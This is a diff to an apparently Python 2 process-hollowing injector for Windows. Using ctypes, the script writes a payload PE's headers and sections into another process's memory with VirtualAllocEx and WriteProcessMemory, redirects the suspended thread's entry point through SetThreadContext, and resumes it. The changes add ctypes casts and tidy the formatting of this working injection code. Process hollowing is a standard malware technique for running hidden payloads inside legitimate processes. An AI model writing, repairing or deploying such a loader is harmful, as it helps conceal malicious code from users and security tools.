@@ -130,8 +130,14 @@ payload_NumberOfSections = payload.FILE_HEADER.NumberOfSections
 payload_AddressOfEntryPoint = payload.OPTIONAL_HEADER.AddressOfEntryPoint
 payload.close()
 
-payload_data_pointer = cdll.msvcrt.calloc((payload_size+1), sizeof(c_char))
-memmove(payload_data_pointer, payload_data, payload_size)
+payload_data_pointer = cdll.msvcrt.calloc(
+                                c_int(payload_size+1),
+                                sizeof(c_char))
+
+
+memmove(                        payload_data_pointer,
+                                payload_data,
+                                payload_size)
 
 print "\t[+]Data from the PE Header: "
 print "\t[+]Image Base Address: " + str(hex(payload_ImageBase))
@@ -160,8 +166,8 @@ PAGE_EXECUTE_READWRITE = 0x40
 
 address = windll.kernel32.VirtualAllocEx(
                                 hProcess, 
-                                payload_ImageBase, 
-                                payload_SizeOfImage, 
+                                c_char_p(payload_ImageBase), 
+                                c_int(payload_SizeOfImage), 
                                 MEM_COMMIT|MEM_RESERVE, 
                                 PAGE_EXECUTE_READWRITE)
 
@@ -176,9 +182,9 @@ lpNumberOfBytesWritten = c_size_t(0)
 
 if windll.kernel32.WriteProcessMemory(
                                 hProcess,
-                                payload_ImageBase,
-                                payload_data_pointer,
-                                payload_SizeOfHeaders,
+                                c_char_p(payload_ImageBase),
+                                c_char_p(payload_data_pointer),
+                                c_int(payload_SizeOfHeaders),
                                 byref(lpNumberOfBytesWritten)) == 0:
                 error()
 
@@ -203,9 +209,9 @@ for i in range(payload_NumberOfSections):
 
         if windll.kernel32.WriteProcessMemory(
                                 hProcess,
-                                dst,
-                                src,
-                                size,
+                                c_char_p(dst),
+                                c_char_p(src),
+                                c_int(size),
                                 byref(lpNumberOfBytesWritten)) == 0:
                  error()
                  
@@ -229,12 +235,12 @@ cx.Eax = payload_ImageBase + payload_AddressOfEntryPoint
 lpNumberOfBytesWritten  = c_size_t(0)
 if windll.kernel32.WriteProcessMemory(
                                 hProcess,
-                                cx.Ebx+8,
-                                (payload_data_pointer+0x11C),
-                                4,
-                                None) ==0:
+                                c_char_p(cx.Ebx+8),
+                                c_char_p(payload_data_pointer+0x11C),
+                                c_int(4),
+                                byref(lpNumberOfBytesWritten)) == 0:
          error()
-print "\t[-]Bytes written:", lpNumberOfBytesWritten.value
+print "\t[+]Bytes written:", lpNumberOfBytesWritten.value
 
 print 
 print "[" + str( 10 + payload_NumberOfSections ) + "]Setting Context"
@@ -244,7 +250,7 @@ windll.kernel32.SetThreadContext(
 
 print
 print "[" + str( 11 + payload_NumberOfSections ) + "]Resuming Thread"
-if windll.kernel32.ResumeThread(hThread) ==0:
+if windll.kernel32.ResumeThread(hThread) == 0:
         error()
 
 print
